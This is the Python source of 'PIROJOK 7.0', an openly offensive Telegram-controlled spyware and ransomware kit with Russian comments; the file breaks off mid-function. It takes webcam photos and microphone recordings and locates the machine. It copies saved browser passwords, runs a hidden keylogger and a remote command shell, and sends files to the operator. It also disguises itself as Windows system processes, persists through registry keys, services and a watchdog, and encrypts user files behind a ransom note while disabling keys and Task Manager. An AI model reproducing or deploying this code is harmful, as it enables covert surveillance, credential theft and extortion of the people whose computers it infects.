#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PIROJOK 7.0 - ПОЛНЫЙ КОМПЛЕКС ШПИОНАЖА
Включает: кейлоггер, загрузка/выгрузка, буфер обмена, удаленная консоль,
кража паролей, геолокация, микрофон, веб-камера
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image, ImageGrab
import io
import ctypes
import winreg
import tempfile
import uuid
import base64
import random
import shutil
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ========== ОПЦИОНАЛЬНЫЕ ИМПОРТЫ (с защитой от ошибок) ==========
try:
    import cv2
    WEBCAM_AVAILABLE = True
except:
    WEBCAM_AVAILABLE = False

try:
    import sounddevice as sd
    import soundfile as sf
    MIC_AVAILABLE = True
except:
    MIC_AVAILABLE = False

try:
    import win32clipboard
    CLIPBOARD_AVAILABLE = True
except:
    CLIPBOARD_AVAILABLE = False

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class SpyModule:
    """Модуль шпионажа - камера, микрофон, геолокация и т.д."""
    
    def __init__(self, parent):
        self.p = parent
        self.keylogger_active = False
        self.keylog_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
        self.keylogger_thread = None
        
    # ========== ВЕБ-КАМЕРА ==========
    def capture_webcam(self):
        """Сделать фото с веб-камеры"""
        try:
            if not WEBCAM_AVAILABLE:
                return "[ERROR] OpenCV not installed"
            
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return "[ERROR] No webcam found"
            
            return_value, image = camera.read()
            camera.release()
            
            if return_value:
                # Сохраняем во временный файл
                img_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
                cv2.imwrite(img_path, image)
                
                # Читаем для отправки
                with open(img_path, 'rb') as f:
                    img_data = f.read()
                
                os.remove(img_path)
                return img_data
            else:
                return "[ERROR] Failed to capture webcam"
        except Exception as e:
            return f"[ERROR] Webcam error: {e}"
    
    # ========== МИКРОФОН ==========
    def record_microphone(self, seconds=5):
        """Записать звук с микрофона"""
        try:
            if not MIC_AVAILABLE:
                return "[ERROR] Sounddevice not installed"
            
            seconds = int(seconds)
            fs = 44100  # Частота дискретизации
            
            self.p.send_message(self.p.owner_id, f"[MIC] Recording {seconds} seconds...")
            
            # Запись
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()
            
            # Сохраняем
            audio_path = os.path.join(tempfile.gettempdir(), "recording.wav")
            sf.write(audio_path, recording, fs)
            
            # Читаем для отправки
            with open(audio_path, 'rb') as f:
                audio_data = f.read()
            
            os.remove(audio_path)
            return audio_data
        except Exception as e:
            return f"[ERROR] Microphone error: {e}"
    
    # ========== ГЕОЛОКАЦИЯ ==========
    def get_location(self):
        """Определить местоположение по IP и Wi-Fi"""
        try:
            result = []
            result.append("[LOCATION] Geolocation data:")
            
            # По IP
            try:
                ip_response = requests.get('http://ip-api.com/json/', timeout=5)
                if ip_response.status_code == 200:
                    data = ip_response.json()
                    result.append(f"🌐 IP: {data['query']}")
                    result.append(f"📍 Страна: {data['country']}")
                    result.append(f"🏙️ Город: {data['city']}")
                    result.append(f"📡 Провайдер: {data['isp']}")
                    result.append(f"🗺️ Координаты: {data.get('lat', '?')}, {data.get('lon', '?')}")
            except:
                result.append("🌐 IP: неизвестно")
            
            # Wi-Fi сети
            try:
                wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                                            capture_output=True, text=True, encoding='cp866')
                if wifi_result.returncode == 0:
                    result.append("\n📶 Доступные Wi-Fi сети:")
                    lines = wifi_result.stdout.split('\n')
                    for line in lines:
                        if 'SSID' in line or 'Сигнал' in line:
                            result.append(f"   {line.strip()}")
            except:
                pass
            
            return "\n".join(result)
        except Exception as e:
            return f"[ERROR] Location error: {e}"
    
    # ========== КРАЖА ПАРОЛЕЙ ==========
    def steal_passwords(self):
        """Украсть сохраненные пароли из браузеров"""
        try:
            results = []
            results.append("[PASSWORDS] Browser password databases:")
            
            # Chrome
            chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
            if os.path.exists(chrome_path):
                dest = os.path.join(tempfile.gettempdir(), 'chrome_passwords.db')
                try:
                    # Нужно закрыть Chrome перед копированием
                    os.system('taskkill /f /im chrome.exe >nul 2>&1')
                    time.sleep(1)
                    shutil.copy2(chrome_path, dest)
                    results.append(f"✅ Chrome: {dest}")
                except:
                    results.append("❌ Chrome: failed to copy")
            
            # Firefox
            firefox_profile = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
            if os.path.exists(firefox_profile):
                for profile in os.listdir(firefox_profile):
                    if 'default' in profile.lower():
                        logins_path = os.path.join(firefox_profile, profile, 'logins.json')
                        if os.path.exists(logins_path):
                            dest = os.path.join(tempfile.gettempdir(), 'firefox_logins.json')
                            try:
                                os.system('taskkill /f /im firefox.exe >nul 2>&1')
                                time.sleep(1)
                                shutil.copy2(logins_path, dest)
                                results.append(f"✅ Firefox: {dest}")
                            except:
                                results.append("❌ Firefox: failed to copy")
            
            # Edge
            edge_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data')
            if os.path.exists(edge_path):
                dest = os.path.join(tempfile.gettempdir(), 'edge_passwords.db')
                try:
                    os.system('taskkill /f /im msedge.exe >nul 2>&1')
                    time.sleep(1)
                    shutil.copy2(edge_path, dest)
                    results.append(f"✅ Edge: {dest}")
                except:
                    results.append("❌ Edge: failed to copy")
            
            return "\n".join(results)
        except Exception as e:
            return f"[ERROR] Password stealing failed: {e}"
    
    # ========== БУФЕР ОБМЕНА ==========
    def get_clipboard(self):
        """Получить содержимое буфера обмена"""
        try:
            if not CLIPBOARD_AVAILABLE:
                return "[ERROR] win32clipboard not installed"
            
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData()
                if data:
                    return f"[CLIPBOARD]\n{data[:1000]}"
                else:
                    return "[CLIPBOARD] Empty"
            except:
                return "[CLIPBOARD] Not text data"
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            return f"[ERROR] Clipboard error: {e}"
    
    # ========== КЕЙЛОГГЕР ==========
    def start_keylogger(self):
        """Запустить кейлоггер"""
        try:
            if self.keylogger_active:
                return "[KEYLOG] Already running"
            
            # Создаем VBS скрипт для кейлоггера
            vbs_path = os.path.join(tempfile.gettempdir(), "keylogger.vbs")
            log_path = self.keylog_file
            
            with open(vbs_path, 'w') as f:
                f.write(f'''
' Кейлоггер на VBS
Dim WSH, FSO, logFile
Set WSH = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
logFile = "{log_path}"

' Словарь для специальных клавиш
Dim specialKeys
Set specialKeys = CreateObject("Scripting.Dictionary")
specialKeys.Add 8, "[BACKSPACE]"
specialKeys.Add 9, "[TAB]"
specialKeys.Add 13, "[ENTER]"
specialKeys.Add 16, "[SHIFT]"
specialKeys.Add 17, "[CTRL]"
specialKeys.Add 18, "[ALT]"
specialKeys.Add 20, "[CAPSLOCK]"
specialKeys.Add 27, "[ESC]"
specialKeys.Add 32, " "
specialKeys.Add 33, "[PGUP]"
specialKeys.Add 34, "[PGDN]"
specialKeys.Add 35, "[END]"
specialKeys.Add 36, "[HOME]"
specialKeys.Add 37, "[LEFT]"
specialKeys.Add 38, "[UP]"
specialKeys.Add 39, "[RIGHT]"
specialKeys.Add 40, "[DOWN]"
specialKeys.Add 45, "[INS]"
specialKeys.Add 46, "[DEL]"
specialKeys.Add 91, "[WIN]"
specialKeys.Add 92, "[WIN]"
specialKeys.Add 112, "[F1]"
specialKeys.Add 113, "[F2]"
specialKeys.Add 114, "[F3]"
specialKeys.Add 115, "[F4]"
specialKeys.Add 116, "[F5]"
specialKeys.Add 117, "[F6]"
specialKeys.Add 118, "[F7]"
specialKeys.Add 119, "[F8]"
specialKeys.Add 120, "[F9]"
specialKeys.Add 121, "[F10]"
specialKeys.Add 122, "[F11]"
specialKeys.Add 123, "[F12]"

' Основной цикл
Do While True
    For i = 8 To 255
        If specialKeys.Exists(i) Then
            key = specialKeys(i)
        Else
            key = Chr(i)
        End If
        
        If WSH.LogEvent(i) Then
            ' Записываем в файл
            FSO.OpenTextFile(logFile, 8, True).Write key
        End If
    Next
    WScript.Sleep 10
Loop
''')
            
            # Запускаем скрыто
            subprocess.Popen(['wscript', '//B', vbs_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            self.keylogger_active = True
            return f"[KEYLOG] Started (log: {self.keylog_file})"
        except Exception as e:
            return f"[ERROR] Keylogger failed: {e}"
    
    def stop_keylogger(self):
        """Остановить кейлоггер"""
        try:
            os.system('taskkill /f /im wscript.exe /fi "windowtitle eq *keylogger*" >nul 2>&1')
            self.keylogger_active = False
            return "[KEYLOG] Stopped"
        except:
            return "[KEYLOG] Failed to stop"
    
    def get_keylog(self):
        """Получить лог нажатий"""
        try:
            if os.path.exists(self.keylog_file):
                with open(self.keylog_file, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
                return f"[KEYLOG]\n{data[-1000:]}"  # Последние 1000 символов
            else:
                return "[KEYLOG] No data yet"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def clear_keylog(self):
        """Очистить лог"""
        try:
            if os.path.exists(self.keylog_file):
                os.remove(self.keylog_file)
            return "[KEYLOG] Cleared"
        except:
            return "[ERROR] Failed to clear"


class FileManager:
    """Модуль управления файлами - загрузка/выгрузка"""
    
    def __init__(self, parent):
        self.p = parent
        self.download_folder = os.path.join(tempfile.gettempdir(), "pirojok_downloads")
        os.makedirs(self.download_folder, exist_ok=True)
    
    def upload_file(self, filepath):
        """Отправить файл с духовки в Telegram"""
        try:
            if not os.path.exists(filepath):
                return f"[ERROR] File not found: {filepath}"
            
            # Проверяем размер
            file_size = os.path.getsize(filepath)
            if file_size > 50 * 1024 * 1024:  # 50 MB лимит Telegram
                return "[ERROR] File too large (max 50MB)"
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            url = f"{self.p.base_url}/sendDocument"
            files = {'document': (os.path.basename(filepath), file_data)}
            data = {'chat_id': self.p.owner_id}
            
            response = requests.post(url, files=files, data=data, timeout=60)
            
            if response.status_code == 200:
                return f"[UPLOAD] File sent: {os.path.basename(filepath)} ({file_size} bytes)"
            else:
                return f"[ERROR] Upload failed: {response.status_code}"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def download_file(self, url, filename=None):
        """Скачать файл на духовку из Telegram"""
        try:
            if not filename:
                filename = url.split('/')[-1].split('?')[0]
                if not filename:
                    filename = f"download_{int(time.time())}.bin"
            
            save_path = os.path.join(self.download_folder, filename)
            
            self.p.send_message(self.p.owner_id, f"[DOWNLOAD] Downloading {filename}...")
            
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                
                file_size = os.path.getsize(save_path)
                return f"[DOWNLOAD] Saved: {save_path} ({file_size} bytes)"
            else:
                return f"[ERROR] Download failed: {response.status_code}"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def list_downloads(self):
        """Список скачанных файлов"""
        try:
            files = os.listdir(self.download_folder)
            if not files:
                return "[FILES] No downloaded files"
            
            result = ["[FILES] Downloaded files:"]
            for f in files:
                path = os.path.join(self.download_folder, f)
                size = os.path.getsize(path)
                modified = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
                result.append(f"  📄 {f} ({size} bytes) - {modified}")
            
            return "\n".join(result)
        except Exception as e:
            return f"[ERROR] {e}"


class RemoteShell:
    """Удаленная консоль"""
    
    def __init__(self, parent):
        self.p = parent
        self.history = []
    
    def execute(self, command):
        """Выполнить команду в cmd"""
        try:
            self.history.append(f"> {command}")
            
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            stdout, stderr = process.communicate(timeout=30)
            
            result = ""
            if stdout:
                result += f"[OUT]\n{stdout}\n"
            if stderr:
                result += f"[ERR]\n{stderr}\n"
            
            if not result:
                result = "[OK] Command executed (no output)"
            
            self.history.append(result[:200])
            return result[:3500]
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "[ERROR] Command timeout (30s)"
        except Exception as e:
            return f"[ERROR] {e}"
    
    def get_history(self):
        """Показать историю команд"""
        return "\n".join(self.history[-20:])


class ProcessHider:
    """Process hiding and masquerading module"""
    
    def __init__(self, parent):
        self.p = parent
        self.masked = False
        self.current_mask = None
        self.mask_level = 0
        self.original_name = None
        self.hidden_pid = None
        self.watchdog_file = None
        self.watchdog_active = False
        
        # Legitimate Windows processes for masquerading
        self.mask_processes = [
            "svchost.exe", "explorer.exe", "RuntimeBroker.exe",
            "dllhost.exe", "conhost.exe", "taskhostw.exe",
            "fontdrvhost.exe", "spoolsv.exe", "SearchIndexer.exe",
            "sihost.exe", "backgroundTaskHost.exe", "smss.exe",
            "csrss.exe", "winlogon.exe", "services.exe",
            "lsass.exe", "svchost.exe", "wininit.exe"
        ]
        
    def auto_masquerade(self):
        """Automatic masquerading at startup"""
        try:
            if platform.system() != "Windows":
                return
            
            # Check if already running under mask
            current_exe = sys.executable.lower() if getattr(sys, 'frozen', False) else ""
            for proc in self.mask_processes:
                if proc.lower() in current_exe:
                    print(f"Already running as {proc}")
                    self.masked = True
                    self.current_mask = proc
                    return
            
            # Save original name
            if getattr(sys, 'frozen', False):
                self.original_name = sys.executable
            else:
                self.original_name = os.path.abspath(__file__)
            
            # Choose random process for masquerading
            self.current_mask = random.choice(self.mask_processes)
            self.mask_level = random.randint(1, 3)
            
            # Apply masquerading
            if self.mask_level >= 1:
                self.mask_process_name()
            
            if self.mask_level >= 2 and self.p.admin_mode:
                self.mask_registry_keys()
            
            if self.mask_level >= 3 and self.p.admin_mode:
                self.mask_file_attributes()
            
        except Exception as e:
            print(f"Masquerade error: {e}")
    
    def mask_process_name(self):
        """Masquerade process name"""
        try:
            if not getattr(sys, 'frozen', False):
                return
            
            current_dir = os.path.dirname(sys.executable)
            masked_path = os.path.join(current_dir, self.current_mask)
            
            if not os.path.exists(masked_path):
                print(f"Creating copy: {masked_path}")
                shutil.copy2(sys.executable, masked_path)
                
                # Create restart script
                restart_script = os.path.join(tempfile.gettempdir(), "restart_pirojok.bat")
                with open(restart_script, 'w') as f:
                    f.write(f'''@echo off
timeout /t 2 /nobreak > nul
start "" "{masked_path}"
del "%~f0"
''')
                
                print(f"Restarting as {self.current_mask}")
                subprocess.Popen(['cmd', '/c', restart_script], shell=True, 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
                self.p.send_message(self.p.owner_id, f"[MASK] Restarting as {self.current_mask}")
                time.sleep(3)
                sys.exit(0)
            else:
                self.masked = True
                
        except Exception as e:
            print(f"Error masking name: {e}")
    
    def mask_registry_keys(self):
        """Masquerade registry entries"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, 
                                 f"C:\\Windows\\System32\\{self.current_mask}")
        except:
            pass
    
    def mask_file_attributes(self):
        """Hide file attributes"""
        try:
            if getattr(sys, 'frozen', False):
                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 4)
        except:
            pass
    
    def inject_into_system(self):
        """Inject into legitimate system process (requires admin)"""
        try:
            if not self.p.admin_mode:
                return "[ERROR] Need admin rights for process injection"
            
            if getattr(sys, 'frozen', False):
                current_exe = sys.executable
            else:
                return "[ERROR] Can only inject compiled EXE"
            
            # Use temp directory instead of System32
            temp_dir = os.path.join(os.environ['TEMP'], 'MicrosoftUpdate')
            os.makedirs(temp_dir, exist_ok=True)
            masked_path = os.path.join(temp_dir, 'wuauclt.exe')
            
            # Copy itself
            shutil.copy2(current_exe, masked_path)
            
            # Create Windows service
            service_name = "WindowsUpdateService" + str(random.randint(1000, 9999))
            
            result = subprocess.run([
                'sc', 'create', service_name,
                'binPath=', f'"{masked_path}"',
                'start=', 'auto',
                'DisplayName=', 'Windows Update Service'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                subprocess.run(['sc', 'start', service_name], capture_output=True)
                ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
                return f"[INJECT] Created service: {service_name}\n[PATH] {masked_path}"
            else:
                return f"[ERROR] Service creation failed: {result.stderr}"
            
        except Exception as e:
            return f"[ERROR] Injection failed: {e}"
    
    def setup_watchdog(self):
        """Create watchdog file to restore if deleted"""
        try:
            if getattr(sys, 'frozen', False):
                current_exe = sys.executable
                
                # Create copies in multiple locations
                locations = [
                    os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Caches'),
                    os.path.join(os.environ['TEMP'], 'Microsoft'),
                    os.path.join(os.environ['SystemRoot'], 'Temp', 'MicrosoftUpdate'),
                    os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Caches')
                ]
                
                backup_paths = []
                for loc in locations:
                    try:
                        os.makedirs(loc, exist_ok=True)
                        backup_path = os.path.join(loc, 'wuauclt.exe.bak')
                        shutil.copy2(current_exe, backup_path)
                        ctypes.windll.kernel32.SetFileAttributesW(backup_path, 2)
                        backup_paths.append(backup_path)
                    except:
                        pass
                
                # Create watchdog script
                self.watchdog_file = os.path.join(tempfile.gettempdir(), "watchdog.vbs")
                with open(self.watchdog_file, 'w') as f:
                    f.write(f'''
Set WShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' List of backup locations
backupPaths = Array({', '.join([f'"{p}"' for p in backup_paths])})

Do While True
    ' Check if main process is running
    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%Pirojok%' OR Name LIKE '%wuauclt%'")
    
    If colProcesses.Count = 0 Then
        ' Try to restore from any available backup
        For Each backupPath In backupPaths
            If FSO.FileExists(backupPath) Then
                tempPath = WShell.ExpandEnvironmentStrings("%TEMP%") & "\\wuauclt.exe"
                FSO.CopyFile backupPath, tempPath, True
                WShell.Run """" & tempPath & """", 0, False
                Exit For
            End If
        Next
    End If
    
    WScript.Sleep 30000  ' Check every 30 seconds
Loop
''')
                
                # Run watchdog hidden
                subprocess.Popen(['wscript', '//B', self.watchdog_file], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
                # Also add to startup
                startup_folder = os.path.join(os.getenv('APPDATA'),
                    r'Microsoft\Windows\Start Menu\Programs\Startup')
                vbs_script = f'''
                Set oWS = WScript.CreateObject("WScript.Shell")
                sLinkFile = "{startup_folder}\\Watchdog.lnk"
                Set oLink = oWS.CreateShortcut(sLinkFile)
                oLink.TargetPath = "wscript.exe"
                oLink.Arguments = "//B "{self.watchdog_file}""
                oLink.WindowStyle = 0
                oLink.Save
                '''
                vbs_path = os.path.join(tempfile.gettempdir(), "watchdog_startup.vbs")
                with open(vbs_path, 'w') as f:
                    f.write(vbs_script)
                subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
                os.remove(vbs_path)
                
                self.watchdog_active = True
                self.p.send_message(self.p.owner_id, f"[WATCHDOG] Activated with {len(backup_paths)} backups")
                return f"[WATCHDOG] Activated with {len(backup_paths)} backups"
            return "[ERROR] Not compiled"
        except Exception as e:
            return f"[ERROR] Watchdog failed: {e}"
    
    def check_watchdog(self):
        """Check if watchdog is active"""
        if self.watchdog_active:
            return "[WATCHDOG] Status: ACTIVE"
        else:
            return "[WATCHDOG] Status: INACTIVE (use 'watchdog' to activate)"
    
    def get_mask_status(self):
        """Get masquerade status"""
        status = f"[MASK] Masquerade: {'ACTIVE' if self.masked else 'INACTIVE'}\n"
        status += f"[MASK] Current mask: {self.current_mask or 'None'}\n"
        status += f"[MASK] Level: {self.mask_level}/3\n"
        if self.hidden_pid:
            status += f"[MASK] Hidden PID: {self.hidden_pid}\n"
        status += self.check_watchdog()
        return status
    
    def remove_masks(self):
        """Remove masquerade"""
        try:
            if self.original_name and os.path.exists(self.original_name):
                if getattr(sys, 'frozen', False):
                    restart_script = os.path.join(tempfile.gettempdir(), "restore_pirojok.bat")
                    with open(restart_script, 'w') as f:
                        f.write(f'''@echo off
timeout /t 2 /nobreak > nul
start "" "{self.original_name}"
del "%~f0"
''')
                    subprocess.Popen(['cmd', '/c', restart_script], shell=True, 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
        except:
            pass


class PirojokRansomware:
    def __init__(self, parent):
        self.p = parent
        self.encryption_key = None
        self.encrypted_files = []
        self.ransom_note = "README_PIROJOK.txt"
        self.cmd_window = None
        self.active = False
        # Расширения для шифрования
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sql', '.mdb', '.accdb',
            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js',
            '.exe', '.dll', '.msi', '.bat', '.cmd'
        ]
        self.exclude_dirs = ['windows', 'winnt', 'program files', 'program files (x86)',
            'boot', 'system32', 'system', '$recycle.bin']
        
    def generate_key(self):
        self.encryption_key = os.urandom(32)
        return base64.b64encode(self.encryption_key).decode()
    
    def block_all_keys(self):
        """FULL key blocking including ESC and Alt+F4"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # Block via registry
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(regkey, "NoViewContextMenu", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(regkey, "NoTrayContextMenu", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(regkey, "NoChangeStartMenu", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(regkey, "NoClose", 0, winreg.REG_DWORD, 1)
            except: pass
            
            # Disable Task Manager
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(regkey, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            except: pass
            
            # Block Alt+Tab, Alt+F4, ESC via SystemParametersInfo
            user32 = ctypes.windll.user32
            user32.SystemParametersInfoW(0x0097, 1, None, 0)  # SPI_SCREENSAVERRUNNING
            
            # Register hotkeys to block specific keys
            # F1-F12
            for i in range(1, 13):
                user32.RegisterHotKey(None, i, 0, 0x70 + i - 1)
            
            # ESC (VK_ESCAPE = 0x1B)
            user32.RegisterHotKey(None, 13, 0, 0x1B)
            
            # Alt+F4 (MOD_ALT = 0x0001, VK_F4 = 0x73)
            user32.RegisterHotKey(None, 14, 0x0001, 0x73)
            
            # Alt+Tab (MOD_ALT = 0x0001, VK_TAB = 0x09)
            user32.RegisterHotKey(None, 15, 0x0001, 0x09)
            
            self.active = True
            return True
            
        except Exception as e:
            print(f"Error blocking keys: {e}")
            return False
    
    def show_cmd_message(self):
        """Show message in CMD window"""
        try:
            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
            message = """
+--------------------------------------------------------------+
|                    PIROJOK RANSOMWARE                        |
+--------------------------------------------------------------+
|                                                              |
|   YOUR FILES HAVE BEEN ENCRYPTED!                            |
|                                                              |
|   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
|   CHECK YOUR TELEGRAM BOT FOR THE KEY                        |
|                                                              |
|   KEYS F1-F12, ESC, SHIFT, CTRL, ALT+F4 ARE BLOCKED!        |
|                                                              |
|   To unlock, enter decryption key in Telegram bot            |
|                                                              |
+--------------------------------------------------------------+
            """
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'''@echo off
title PIROJOK RANSOMWARE
color 0C
mode con cols=70 lines=20
echo {message}
echo.
echo CHECK TELEGRAM FOR DECRYPTION KEY
echo.
pause > nul
''')
            self.cmd_window = subprocess.Popen(
                ['cmd', '/c', 'start', '/min', 'cmd', '/c', bat_path],
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(1)
            os.system(f'start /max cmd /c "{bat_path}"')
        except Exception as e:
            print(f"Error showing CMD: {e}")
    
    def show_decrypted_message(self):
        """Show success message when decrypted"""
        try:
            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_decrypted.bat")
            message = """
+--------------------------------------------------------------+
|                    PIROJOK RANSOMWARE                        |
+--------------------------------------------------------------+
|                                                              |
|   YOUR SYSTEM HAS BEEN DECRYPTED!                            |
|                                                              |
|   ALL FILES HAVE BEEN RESTORED                               |
|                                                              |
|   KEYS ARE NOW UNLOCKED                                      |
|                                                              |
|   YOU CAN USE YOUR COMPUTER NORMALLY                         |
|                                                              |
+--------------------------------------------------------------+
            """
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'''@echo off
title PIROJOK - SYSTEM DECRYPTED
color 0A
mode con cols=70 lines=20
echo {message}
echo.
echo YOUR FILES HAVE BEEN RESTORED
echo.
pause
del "%~f0"
''')
            os.system(f'start /max cmd /c "{bat_path}"')
        except Exception as e:
            print(f"Error showing decrypted message: {e}")
    
    def encrypt_file(self, filepath):
        try:
            iv = os.urandom(16)
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            with open(filepath, 'rb') as f:
                file_data = f.read()
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            encrypted_path = filepath + '.pirojok'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(filepath)
            return encrypted_path
        except: return None
    
    def scan_and_encrypt(self):
        """Scan and encrypt files"""
        if not self.encryption_key:
            self.generate_key()
        
        root_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\OneDrive"),
            "C:\\Users\\Public\\Documents",
            "C:\\Users\\Public\\Downloads",
            "C:\\Users\\Public\\Pictures",
            "C:\\Users\\Public\\Videos"
        ]
        
        encrypted = []
        file_count = 0
        max_files = 200
        
        for root_path in root_paths:
            if not os.path.exists(root_path): continue
            for root, dirs, files in os.walk(root_path):
                skip = False
                for exclude in self.exclude_dirs:
                    if exclude in root.lower():
                        skip = True
                        break
                if skip: continue
                for file in files:
                    if file_count >= max_files: break
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    if ext in self.target_extensions and not file.endswith('.pirojok'):
                        result = self.encrypt_file(file_path)
                        if result:
                            encrypted.append(file_path)
                            self.encrypted_files.append(result)
                            file_count += 1
                            if file_count % 20 == 0:
                                self.p.send_message(self.p.owner_id, f"[LOCK] Encrypted {file_count} files...")
                if file_count >= max_files: break
            if file_count >= max_files: break
        
        return encrypted
    
    def create_ransom_note(self):
        """Create ransom note on REAL desktop"""
        try:
            desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            if not os.path.exists(desktop):
                desktop = os.path.join(os.environ['PUBLIC'], 'Desktop')
            if not os.path.exists(desktop):
                desktop = tempfile.gettempdir()
                
            note_path = os.path.join(desktop, self.ransom_note)
            key_b64 = base64.b64encode(self.encryption_key).decode()
            
            note = f"""
+--------------------------------------------------------------+
|                    PIROJOK RANSOMWARE                        |
+--------------------------------------------------------------+
|                                                              |
|   Your files have been encrypted!                            |
|                                                              |
|   Total encrypted: {len(self.encrypted_files)} files         |
|                                                              |
|   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
|   CHECK YOUR TELEGRAM BOT                                     |
|                                                              |
|   Keys F1-F12, ESC, SHIFT, CTRL, ALT+F4 are BLOCKED!        |
|   Reboot to unlock (will lose files)                         |
|                                                              |
+--------------------------------------------------------------+
        """
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(note)
            return note_path
        except Exception as e:
            fallback = os.path.join(tempfile.gettempdir(), self.ransom_note)
            with open(fallback, 'w', encoding='utf-8') as f:
                f.write(f"[PIROJOK] Files encrypted. Key: {base64.b64encode(self.encryption_key).decode()}")
            return fallback
    
    def start_ransomware(self):
        try:
            self.p.send_message(self.p.owner_id, "[LOCK] Starting ransomware...")
            self.block_all_keys()
            self.p.send_message(self.p.owner_id, "[LOCK] Keys blocked (ESC, ALT+F4 included)!")
            self.show_cmd_message()
            self.p.send_message(self.p.owner_id, "[CMD] Message shown!")
            encrypted = self.scan_and_encrypt()
            note = self.create_ransom_note()
            os.startfile(note)
            self.p.add_all_startup_methods()
